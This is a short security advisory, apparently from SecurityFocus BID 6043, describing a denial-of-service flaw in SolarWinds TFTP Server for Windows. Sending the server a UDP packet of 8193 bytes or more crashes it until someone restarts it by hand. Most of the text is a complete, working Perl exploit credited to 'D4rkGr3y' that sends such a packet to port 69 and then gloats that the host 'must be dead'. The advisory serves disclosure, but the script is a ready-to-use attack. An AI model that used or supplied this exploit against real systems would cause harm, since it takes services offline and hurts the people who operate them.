source: http://www.securityfocus.com/bid/6043/info

A problem in SolarWinds TFTP Server may result in a denial of service, and may have other ramifications. SolarWinds TFTP Server is distributed for the Microsoft Windows platform.

Under some circumstances, it may be possible to crash a vulnerable TFTP server. By sending a UDP packet to the server that is 8193 or more bytes, the server becomes unstable. It has been reported that doing this can consistently reproduce a crash of the server, requiring a manual restart to resume normal operation. 

#!/usr/bin/perl
#TFTP Server remote DoS exploit by D4rkGr3y
use IO::Socket;
$host = "vulnerable_host";
$port = "69";
$data = "q";
$num = "8193";
$buf .= $data x $num;
$socket = IO::Socket::INET->new(Proto => "udp") or die "Socket error: $@\n";
$ipaddr = inet_aton($host);
$portaddr = sockaddr_in($port, $ipaddr);
send($socket, $buf, 0, $portaddr) == length($buf) or die "Can't send: $!\n";
print "Now, '$host' must be dead :)\n";

#EOF